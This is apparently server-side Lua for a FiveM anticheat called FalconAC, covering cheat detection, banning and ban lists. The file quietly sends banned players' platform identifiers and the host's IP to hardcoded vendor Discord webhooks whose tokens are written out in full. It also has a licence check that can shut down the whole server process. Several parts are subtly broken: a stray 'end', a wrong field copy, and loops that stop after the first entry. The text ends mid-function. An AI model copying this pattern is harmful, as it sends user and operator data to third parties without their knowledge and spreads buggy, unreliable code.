local ResourceMetadata = {}
local ResourceFiles = {}

function banlistregenerator()
	local o = LoadResourceFile(GetCurrentResourceName(), "bans.json")
	if not o or o == "" then
		SaveResourceFile(GetCurrentResourceName(), "bans.json", "[]", -1)
		print("^"..math.random(1, 9).."^3Warning! ^0Your ^1bans.json ^0is missing, Regenerating your ^1bans.json ^0file!")
	else
		local p = json.decode(o)
		if not p then
			SaveResourceFile(GetCurrentResourceName(), "bans.json", "[]", -1)
			p = {}
			print("^"..math.random(1, 9).."^3Warning! ^0Your ^1bans.json ^0is corrupted, Regenerating your ^1bans.json ^0file!")
		end
	end
end

function AntiCheatBans(source,reason)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local data = json.decode(config)
	local _src = source

    if config == nil then
        banlistregenerator()
        return
    end

    if GetPlayerName(_src) == nil then
		return
	end

    local myid = GetIdentifier(_src);

    local playerSteam = myid.steam;
    local playerLicense = myid.license;
    local playerXbl = myid.xbl;
    local playerLive = myid.live;
    local playerDiscord = myid.discord;
    local banInfo = {};

    banInfo['ID'] = tonumber(GetAndBanID());
	banInfo['reason'] = reason;
    banInfo['license'] = "No Info";
    banInfo['steam'] = "No Info";
    banInfo['xbl'] = "No Info";
    banInfo['live'] = "No Info";
    banInfo['discord'] = "No Info";
    banInfo['hwid'] = GetPlayerToken(source)
    
    if playerLicense ~= nil and playerLicense ~= "nil" and playerLicense ~= "" then 
        banInfo['license'] = tostring(playerLicense);
    end
    if playerSteam ~= nil and playerSteam ~= "nil" and playerSteam ~= "" then 
        banInfo['steam'] = tostring(playerSteam);
    end
    if playerXbl ~= nil and playerXbl ~= "nil" and playerXbl ~= "" then 
        banInfo['xbl'] = tostring(playerXbl);
    end
    if playerLive ~= nil and playerLive ~= "nil" and playerLive ~= "" then 
        banInfo['live'] = tostring(playerXbl);
    end
    if playerDiscord ~= nil and playerDiscord ~= "nil" and playerDiscord ~= "" then 
        banInfo['discord'] = tostring(playerDiscord);
    end
    if playerHwid ~= nil and playerHwid ~= "nil" and playerHwid ~= "" then 
        banInfo['hwid'] = tostring(playerHwid);
    end
    data[tostring(GetPlayerName(source))] = banInfo;
    SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(data, { indent = true }), -1)
end

function GetIdentifier(source)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = "",
        hwid = ""
    }

    for i = 0, GetNumPlayerIdentifiers(source) - 1 do
        local id = GetPlayerIdentifier(source, i)
        local hwid = GetPlayerToken(source)

        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.find(id, "discord") then
            identifiers.discord = id
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        elseif string.find(hwid, "hwid") then
            identifiers.hwid = hwid
        end
    end

    return identifiers
end

function GetAndBanID()
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local data = json.decode(config)
    local banID = 0;
    for k, v in pairs(data) do 
        banID = banID + 1;
    end
    return (banID + 1);
end

function sendwebhooktodc(content)
    local _source = source
    local connect = 
    {
        {
            ["color"] = "13263616",
            ["title"] = "Falcon AntiCheat",
            ["description"] = "Player: "..GetPlayerName(_source).. " "  ..GetPlayerIdentifiers(_source)[1].."", content,
            ["footer"] = {
            ["text"] = "FalconAC v1.0",
            },
        }
    }
    PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "FalconAC", embeds = connect}), { ['Content-Type'] = 'application/json' })
end

function kickorbancheater(source,content,info,c,d)
    local _source = source
    local hwidd = GetPlayerToken(_source)
    local steam = "unknown"
	local discord = "unknown"
	local license = "unknown"
	local live = "unknown"
	local xbl = "unknown"
    local hwid = "unknown"

    if not IsPlayerAceAllowed(_source, "facbypass") then
	    for m, n in ipairs(GetPlayerIdentifiers(_source)) do
	    	if n:match("steam") then
	    		steam = n
	    	elseif n:match("discord") then
	    		discord = n:gsub("discord:", "")
	    	elseif n:match("license") then
	    		license = n
	    	elseif n:match("live") then
	    		live = n
	    	elseif n:match("xbl") then
	    		xbl = n
            elseif n:match("hwid") then
	    		hwid = hwidd
	    	end
	    end

        local discordinfo = {
            {
                ["color"] = "13263616",
                ["title"] = "FalconAC Banned",
                ["description"] = "**Player: **"..GetPlayerName(source).. "\n**ServerID:** ".._source.."\n**Violation:** "..content.."\n**Details:** "..info.."\n**Steam:** "..steam.."\n**License: **"..license.."\n**Xbl: **"..xbl.."\n**Live: **"..live.."\n**Discord**: <@"..discord..">",
                ["footer"] = {
                ["text"] = "FalconAC v1.0 - "..GetConvar("sv_hostname", ""),
                },
            }
        }
        PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "FalconAC", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })
        PerformHttpRequest("https://discordapp.com/api/webhooks/932056715761942538/LlVLiTYmEaRi1cGbvjySN7jdhdJQTm2W7Iy8XkrpmtB2v_MnlaOeqcpeF17NCy-WcwoH", function(err, text, headers) end, 'POST', json.encode({username = "FalconAC GlobalBan", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })

        if d then
            AntiCheatBans(source,content)
        end

        if c then
            DropPlayer(source, "FalconAC: "..Config.KickReason)
        end
    end
end
 
function OnPlayerConnecting(name, setKickReason, deferrals)
    deferrals.defer();
    local src = source;
    local banned = false;
    local ban = getBanned(src);
    
    Citizen.Wait(100);
   
	if ban then
        local reason = ban['reason'];
        local BanID = ban['banID'];
        deferrals.done("FalconAC Banned!🍁\n\n [⛔] You are restricted from connecting to this server for the following reason: Cheating\n\nViolation: "..reason.."\nBanID: " .. ban['banID'] .." ✔️");
        banned = true;
        CancelEvent();
		return;
    end

    if not banned then 
        deferrals.done();
    end	
end

function getBanned(source)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local data = json.decode(config)

    if config == nil then
        banlistregenerator()
        return
    end
    
	local myid = GetIdentifier(source);
    local playerSteam = myid.steam;
    local playerLicense = myid.license;
    local playerXbl = myid.xbl;
    local playerLive = myid.live;
    local playerDisc = myid.discord;
    local playerHwid = GetPlayerToken(source)
    for k, bigData in pairs(data) do 
        local reason = bigData['reason']
        local id = bigData['ID']
        local license = bigData['license']
        local steam = bigData['steam']
        local xbl = bigData['xbl']
        local live = bigData['live']
        local discord = bigData['discord']
        local hwid = bigData['hwid']
        if tostring(license) == tostring(playerLicense) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(steam) == tostring(playerSteam) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(xbl) == tostring(playerXbl) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(live) == tostring(playerLive) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(discord) == tostring(playerDisc) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(hwid) == tostring(playerHwid) then return { ['banID'] = id, ['reason'] = reason } end;
    end
    return false;
end

AddEventHandler("playerConnecting", OnPlayerConnecting)

RegisterCommand('fac-unban', function(source, args, rawCommand)
    local src = source;
    if (src <= 0) then
        if #args == 0 then 
            print('^3[^8FalconAC^3] ^1Please specify^0');
            return; 
        end
        local banID = args[1];
        if tonumber(banID) ~= nil then
            local playerName = UnbanPlayer(banID);
            if playerName then
                print('^3[^8FalconAC^3] ^0Player ^1' .. playerName 
                .. ' ^0has been unbanned from the server by ^2CONSOLE');
                TriggerClientEvent('chatMessage', -1, '^3[^8FalconAC^3] ^0Player ^1' .. playerName 
                .. ' ^0has been unbanned from the server by ^2CONSOLE^0'); 
            else 
                print('^3[^8FalconAC^3] ^1BanID was not found in banlist!'); 
            end
        end
        return;
    end 
    if IsPlayerAceAllowed(src, "facbypass") then 
        if #args == 0 then 
            TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1Not enough arguments...');
            return; 
        end
        local banID = args[1];
        if tonumber(banID) ~= nil then 
            local playerName = UnbanPlayer(banID);
            if playerName then
                TriggerClientEvent('chatMessage', -1, '^3[^6FalconAC^3] ^0Player ^1' .. playerName 
                .. ' ^0has been unbanned from the server by ^2' .. GetPlayerName(src)); 
            else 
                TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1That is not a valid ban ID. No one has been unbanned!'); 
            end
        else 
            TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1That is not a valid number...'); 
        end
    end
end)
function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v['ID']);
        if id == tonumber(banID) then 
            local name = k;
            cfg[k] = nil;
            SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(cfg, { indent = true }), -1)
            return name;
        end
    end
    return false;
end

RegisterServerEvent("8jWpZudyvjkDXQ2RVXf9")
AddEventHandler("8jWpZudyvjkDXQ2RVXf9", function(type)
    local _type = type or "default"
    local _src = source
    local _name = GetPlayerName(_src)
    _type = string.lower(_type)


    if not IsPlayerAceAllowed(_src, "facbypass") then
        if (_type == "invisible") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Tried to be Invisible", "This Player tried to Invisible",true,true)
        elseif (_type == "antiragdoll") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"AntiRagdoll", "This Player tried to activate Anti-Ragdoll",true,true)
        elseif (_type == "displayradar") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Radar", "This player tried to force minimap on",true,true)
        elseif (_type == "explosiveweapon") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Weapon Explosion Detected", "This Player tried to change bullet type",true,true)
        elseif (_type == "spectatormode") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Spectate", "This Player tried to Spectate a Player",true,true)
        elseif (_type == "speedhack") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"SpeedHack", "This Player tried to SpeedHack",true,true)
        elseif (_type == "blacklistedweapons") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Blacklisted Weapon", "This Player tried to spawn a Blacklisted Weapon",true,true)
        elseif (_type == "thermalvision") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Thermal Camera Detected", "This Player tried to use Thermal Camera",true,true)
        elseif (_type == "nightvision") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Night Vision Detected", "This Player tried to use Night Vision",true,true)
        elseif (_type == "antiresourcestop") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Resource Stop", "This Player tried to stop a Resource",true,true)
        elseif (_type == "pedchanged") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Ped Changed", "This Player tried to change his PED",true,true)
        elseif (_type == "freecam") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"FreeCam", "This Player tried to use Freecam",true,true)
        elseif (_type == "infiniteammo") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Infinite Ammo Detected", "This Player tried to put Infinite Ammo",true,true)
        elseif (_type == "resourcestarted") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"AntiResourceStart", "This Player tried to start a resource",true,true)
        elseif (_type == "menyoo") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Menyoo", "This Player tried to inject Menyoo Menu",true,true)
        elseif (_type == "givearmour") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Give Armor", "This Player tried to Give Armor",true,true)
        elseif (_type == "aimassist") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Aim Assist", "This Player tried Aim Assist Detected. Mode: ",true,true)
        elseif (_type == "infinitestamina") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Infinite Stamina", "This Player tried to use Infinite Stamina",true,true)
        elseif (_type == "superjump") then
            if IsPlayerUsingSuperJump(_src) then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(_src,"Superjump", "This Player tried to use Superjump",true,true)
            end
        elseif (_type == "vehicleweapons") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Vehicle Weapons Detected", "This Player tried to use Vehicle Weapons",true,true)
        elseif (_type == "blacklistedtask") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Blacklisted Task", "Tried to execute a blacklisted task.",true,true)
        elseif (_type == "blacklistedanim") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Blacklisted Anim", "Tried executing a blacklisted anim. This player might not be a cheater.",true,true)
        elseif (_type == "receivedpickup") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Pickup received", "Pickup received.",true,true)
        elseif (_type == "shotplayerwithoutbeingonhisscreen") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Aimbot/TriggerBot", "Hit a Player Without Being in his Screen. Possible Aimbot/TriggerBot/RageBot. Distance Difference.",true,true)
        elseif (_type == "aimbot") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Aimbot", "Aimbot detected.",true,true)
        elseif (_type == "stoppedac") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Resource Stop", "Tried to stop the Anticheat.",true,true)
        elseif (_type == "stoppedresource") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Resource Stop", "Tried to stop a resource.",true,true)
        end
    end
end
end)

RegisterNetEvent('JzKD3yfGZMSLTqu9L4Qy')
AddEventHandler('JzKD3yfGZMSLTqu9L4Qy', function(resource, info)
    local _src = source
    if resource ~= nil and info ~= nil then
        TriggerClientEvent("fac:screenshot", -1)
        Wait(150)
        kickorbancheater(_src,"Injection detected", "Injection detected in resource: "..resource.. "Type: "..info,true,true)
     end
end)

RegisterNetEvent('tYdirSYpJtB77dRC3cvX')
AddEventHandler('tYdirSYpJtB77dRC3cvX', function()
    local _src = source
    if not IsPlayerAceAllowed(_src, "facbypass") then
        local players = {}
        for _,v in pairs(GetPlayers()) do
            table.insert(players, {
                name = GetPlayerName(v),
                id = v
            })
        end
        TriggerClientEvent("fac:screenshot", -1)
        Wait(150)
        kickorbancheater(_src,"Give Weapon To Ped", "This Player tried Give Weapon to Ped.",true,true)
    end
end)
if Config.AntiResource then
RegisterNetEvent('PJHxig0KJQFvQsrIhd5h')
AddEventHandler('PJHxig0KJQFvQsrIhd5h', function(Metadata, Files)
    local _src = source
    local _mdata = Metadata
    local _files = Files
    if _mdata ~= nil then
        for k,v in pairs(_mdata) do
            if not Config.WhitelistedResources[k] then
                if not ResourceMetadata[k] then
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(_src,"Resource Injection", "Anormal resource injection. Resource: "..k,true,true)
                end
                if json.encode(ResourceMetadata[k]) ~= json.encode(_mdata[k]) then
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(_src,"Resource Injection", "Resource metadata not valid in resource: "..k,true,true)
                end
            end
            if k == "unex" or k == "Unex" or k == "rE" or k == "redENGINE" or k == "Eulen" then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(_src,"Resource Injection", "Executor detected: "..k,true,true)
            end
        end
        for k,v in pairs(ResourceMetadata) do
            if not Config.WhitelistedResources[k] then
                if not _mdata[k] then
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(_src,"Resource Injection", "Injection Resource stopped: "..k,true,true)
                end
                if json.encode(_mdata[k]) ~= json.encode(ResourceMetadata[k]) then
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(_src,"Resource Injection", "Resource metadata not valid in resource: "..k,true,true)
                end
            end
            if k == "unex" or k == "Unex" or k == "rE" or k == "redENGINE" or k == "Eulen" then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(500)
                kickorbancheater(_src,"Resource Injection", "Executor detected: "..k,true,true)
            end
        end
    end
    if _files ~= nil then
        for k,v in pairs(_files) do
            if not Config.WhitelistedResources[k] then
                if json.encode(ResourceFiles[k]) ~= json.encode(v) then
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(_src,"Resource Injection", "Client script files modified in resource: "..k,true,true)
                end
            end
        end
    end
end)
end

if Config.ClearPedTasksImmediatelyDetection then
    AddEventHandler("clearPedTasksEvent", function(source, data)
        if data.immediately then
            CancelEvent()
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(source,"ClearPedTasks", "Tried to kick another player out of vehicle",true,true)
        end
    end)
end

function inTable(tbl, item)
    for key, value in pairs(tbl) do
        if value == item then return key end
    end
    return false
end

if Config.ExplosionProtection then
    AddEventHandler(
        "explosionEvent",
        function(sender, ev)
            if ev.damageScale ~= 0.0 then
                local BlacklistedExplosionsArray = {}

                for kkk, vvv in pairs(Config.BlockedExplosions) do
                    table.insert(BlacklistedExplosionsArray, vvv)
                end

                if inTable(BlacklistedExplosionsArray, ev.explosionType) ~= false then
                    CancelEvent()
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(sender,"Blacklisted Explosion", "Explosion Type: "..ev.explosionType,true,true)
                end
            end
        end
    )
end

function has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

Empty = {}

Citizen.CreateThread(function()
    PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
        Empty.CurrentIP = text
        Auth()
    end, 'GET')
end)

function SelfDestruct(Reason)
    PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
        Empty.CurrentIP = text
        LogDiscord("https://discordapp.com/api/webhooks/857960554370301962/2aAdDrLbUiKl1vUfXOEWdGMJQDNSC2VPzXCjurApLlF1eAazMVrjTqgCxQQTcGmDi2Tm", "**Destruct Reason:** " .. Reason .. "\n **IP: **" .. Empty.CurrentIP)
    end, 'GET')
end

function LogDiscord(Webhook, Message)
    local Content = {
        {
            ["author"] = {
                ["name"] = "FalconAC",
                ["icon_url"] = "https://cdn.freebiesupply.com/images/large/2x/atlanta-falcons-logo-transparent.png"
            },
            ["color"] = "16711680",
            ["description"] = Message,
            ["footer"] = {
                ["text"] = "Server: "..GetConvar("sv_hostname", ""),
                ["icon_url"] = "https://cdn.freebiesupply.com/images/large/2x/atlanta-falcons-logo-transparent.png"
            }
        }
    }
    PerformHttpRequest(Webhook, function(err, text, headers) end, "POST", json.encode({username = "Falcon Logs", embeds = Content}), {["Content-Type"] = "application/json"})
end

function Auth()
    PerformHttpRequest("https://pastebin.com/raw/sjeZiC3G", function(err, text, headers)
        Empty.IPTable = json.decode(text)
        if Empty.IPTable ~= nil or Empty.IPTable ~= "" then
            if has_value(Empty.IPTable, Empty.CurrentIP) then
                print("^4[^8FalconAC^4] Falcon AntiCheat - SCA Company^0")
                Wait(1000)
                print("^2[^8FalconAC^2] Successfully authenticated^0")
                Wait(500)
                print("^6[^8FalconAC^6] Successfully loaded FalconAC^0")
                Wait(500)
                print("^5[^8FalconAC^5] Contact support if you need help with any issues!^0")
                Wait(500)
                print("^5[^8FalconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
            else
                SelfDestruct("Failed authentication")
                print("^1[^8FalconAC^1] Failed authentication, please contact support!^0")
                Wait(500)
                print("^3[^8FalconAC^3] Shutting down in 5s!^0")
                Wait(1000)
                print("^3[^8FalconAC^3] Shutting down in 4s!^0")
                Wait(1000)
                print("^3[^8FalconAC^3] Shutting down in 3s!^0")
                Wait(1000)
                print("^3[^8FalconAC^3] Shutting down in 2s!^0")
                Wait(1000)
                print("^3[^8FalconAC^3] Shutting down in 1s!^0")
                Wait(1000)
                print("^3[^8FalconAC^3] Shutting down in 0s!^0")
                StopResource(GetCurrentResourceName())
                os.exit()
            end
        else
            print("No Auth Response. Please wait and try again!")
        end
    end, 'GET')
end

local cachedLicenses = {}

function log(identifier, message)
    local dato = os.date("%d-%m-%Y kl. %X")
    local embedZ = {{
        ["title"] = "FalconAC Globalban",
        ["color"] = tonumber("01006a", 16),
        ["fields"] = {
            {
                ["name"] = "Player",
                ["value"] = "> "..identifier
            },
            {
                ["name"] = "Message",
                ["value"] = "> "..message
            }
        },
        ["footer"] = {
            ["text"] = dato
        }
    }}
    if Config.Webhook ~= "" and Config.Webhook ~= nil then
        PerformHttpRequest(Config.Webhook, function(e, t, h) end, 'POST', json.encode({username = "FalconAC", embeds = embedZ}), { ['Content-Type'] = 'application/json' })
    end
end

function checkBypass(identifier)
    for k,v in pairs(Config.Bypass) do
        if v == identifier then
            return true
        end
    end
    return false
end

Citizen.CreateThread(function()
    PerformHttpRequest("https://raw.githubusercontent.com/falconac12/globallist/main/db.json", function(statusCode, text, headers)
        if statusCode == 200 or statusCode == 304 then
            if text ~= nil and text ~= "" then
                for i,k in pairs(json.decode(text)) do
                    for x,b in pairs(k) do
                        if b ~= "null" and b ~= nil then
                            cachedLicenses[b] = true
                        end
                    end
                end
                print("^0[^8FalconAC^0] ^2Global banlist loaded.^0")
            else
                print("^0[^8FalconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
            end
        else
            print("^0[^8FalconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
        end
    end, 'GET', '')
end)

AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
    local player = source
    local identifiers = GetPlayerIdentifiers(player)
    local found = false
    deferrals.defer()

    Wait(10)

    deferrals.update("Checking banlist...")

    for k,v in pairs(identifiers) do
        if cachedLicenses[v] == true then
            if not checkBypass(v) then
                found = true
                log(v, "User was found in the global banlist and rejected from joining the server.")
                deferrals.done("\n\nFalconAC: You are excluded from this server due to modding.\n\n")
            else
                log(v, "Player was a confirmed modder but is set up in the bypass to connect anyways.")
            end
            break;
        end
    end
    Wait(1000)
    if not found then deferrals.done() end
end)

RegisterNetEvent('chat:server:ServerPSA')
AddEventHandler('chat:server:ServerPSA', function()
	local _src = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(_src,"Fake message detected", "Fake message detected",true,true)
end)

AddEventHandler('entityCreated', function(entity)
    local entity = entity
    if not DoesEntityExist(entity) then
        return
    end
    
    local _src = source
    local src = NetworkGetEntityOwner(entity)
    local entID = NetworkGetNetworkIdFromEntity(entity)
    local model = GetEntityModel(entity)
    local hash = GetHashKey(entity)

    if Config.AntiSpawnVehicles then
        for i, bvc in ipairs(Config.BlacklistedVehicles) do
            if model == bvc then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(src,"Blacklist Vehicle Spawned", "Vehicle: "..bvc.. " Model: "..model.. " Entity: "..entity.. " Hash: "..hash,true,true)
                Wait(1000)
            end
        end
    end

    if Config.AntiSpawnPeds then
        for i, blp in ipairs(Config.BlacklistedPeds) do
            if model == blp then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(src,"Blacklist Ped Spawned", "Ped: "..blp.. " Model: "..model.. " Entity: "..entity.. " Hash: "..hash,true,true)
                Wait(100)
            end
            break
        end
    end
end)

RegisterServerEvent("falcon:antiobject")
AddEventHandler("falcon:antiobject", function(object)
    local src = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(src,"Spawned blacklisted prop/object", "Object: "..object,true,true)
end)

if Config.EventsDetect then
    for k, v in pairs(Config.Events) do
        RegisterServerEvent(v)
        AddEventHandler(v, function()
            local _src = source
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Blacklisted Event", "Blacklisted Event: "..v,true,true)
            CancelEvent()
        end)
    end
end

if Config.AntiVPN then
    local function OnPlayerConnecting(name, setKickReason, deferrals)
        local ip = tostring(GetPlayerEndpoint(source))
        deferrals.defer()
        Wait(0)
        deferrals.update("Checking VPN...")
        PerformHttpRequest(
            "https://blackbox.ipinfo.app/lookup/" .. ip,
            function(errorCode, resultDatavpn, resultHeaders)
                if resultDatavpn == "N" then
                    deferrals.done()
                else
                    print("^8[Falcon]^0: ^1Player ^0" .. name .. " ^1Rejected for using a VPN, ^8IP: ^0" .. ip .. "^0")
                    deferrals.done("FalconAC: VPN is not allowed on this server!")
                end
            end
        )
    end

    AddEventHandler("playerConnecting", OnPlayerConnecting)
end

if Config.ForceDiscord then
    local function OnPlayerConnecting(name, setKickReason, deferrals)
        local player = source
        local discordIdentifier
        local identifiers = GetPlayerIdentifiers(player)
        deferrals.defer()
      
        Wait(0)
      
        for _, v in pairs(identifiers) do
            if string.find(v, "discord") then
                discordIdentifier = v
                break
            end
        end
      
        Wait(0)
      
        if not discordIdentifier then
                deferrals.done("FalconAC: Discord must be connected with FiveM in order to join this server.")
                    if Config.ForceDiscordConsoleLogs then
                        print("^8[FalconAC]^0 " .. name .. " ^3Rejected for not using discord.^0")
                    end
            else
                deferrals.done()
            end
         end
    end
      
AddEventHandler("playerConnecting", OnPlayerConnecting)

if Config.ForceSteam then
    local function OnPlayerConnecting(name, setKickReason, deferrals)
        local player = source
        local steamIdentifier
        local identifiers = GetPlayerIdentifiers(player)
        deferrals.defer()
      
        Wait(0)
      
        for _, v in pairs(identifiers) do
            if string.find(v, "steam") then
                steamIdentifier = v
                break
            end
        end
      
        Wait(0)
      
        if not steamIdentifier then
                deferrals.done("FalconAC: You must have steam open in order to join this server!")
                    if Config.ForceSteamConsoleLogs then
                        print("^9ForceSteam^0 " .. name .. " ^7Rejected for not using steam.")
                    end
            else
                deferrals.done()
            end
         end
    end
      
      AddEventHandler("playerConnecting", OnPlayerConnecting)


AddEventHandler('chatMessage', function(source, color, message)
    local _src = source
    if not message then
        return
    end

    if Config.AntiBlacklistedWords then
        for k, v in pairs(Config.BlacklistWords) do
            if string.match(message, v) then
                Citizen.Wait(1500)
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(_src,"Blacklist Words Detected", "Blacklist Words Detected. Words: "..v,true,true)
                CancelEvent()
            end
            return
        end
    end
end)

RegisterServerEvent('_chat:messageEntered')
AddEventHandler('_chat:messageEntered', function(author, color, message)
    if not message then
        return
    end
    local src = source

    for k, v in pairs(Config.BlacklistWords) do
        if string.match(message, v) then
            Citizen.Wait(1500)
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(src,"Blacklist Words Detected", "Blacklist Words Detected. Words: "..v,true,true)
            CancelEvent()
        end
      return
    end
end)

Citizen.CreateThread(function()
    for i=1, #Config.BlacklistedCommands, 1 do
        RegisterCommand(Config.BlacklistedCommands[i], function(source)
            local _src = source
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Blacklist Command Detected", "Blacklist Command Detected.",true,true)
        end)
    end
end)

RegisterServerEvent("falcon:menudetection")
AddEventHandler("falcon:menudetection", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Menu Detection", "Player tried to inject a menu",true,true)
end)
RegisterServerEvent("falcon:blacklistedkey")
AddEventHandler("falcon:blacklistedkey", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Blacklisted Key", "Player tried to press blacklisted key (Open a executor)",true,true)
end)
RegisterServerEvent("falcon:blacklistedweapon")
AddEventHandler("falcon:blacklistedweapon", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Blacklisted Weapon", "Player had a blacklisted weapon",true,true)
end)
RegisterServerEvent("falcon:ultraspeed")
AddEventHandler("falcon:ultraspeed", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Vehicle Ultraspeed", "Player tried to change speed on vehicle",true,true)
end)
RegisterServerEvent("falcon:godmodee")
AddEventHandler("falcon:godmodee", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Godmode", "Player tried to use godmode",true,true)
end)
RegisterServerEvent("falcon:weapondamage")
AddEventHandler("falcon:weapondamage", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Weapon Damage", "Player tried to change damage on weapon",true,true)
end)
RegisterServerEvent("falcon:bypassdetection")
AddEventHandler("falcon:bypassdetection", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Bypass Detection", "Player tried to bypass a function",true,true)
end)
RegisterServerEvent("falcon:hackdetection")
AddEventHandler("falcon:hackdetection", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Cheat Detected", "A wierd modifying has been applied from the player",true,true)
end)
RegisterServerEvent("falcon:cheatengine")
AddEventHandler("falcon:cheatengine", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
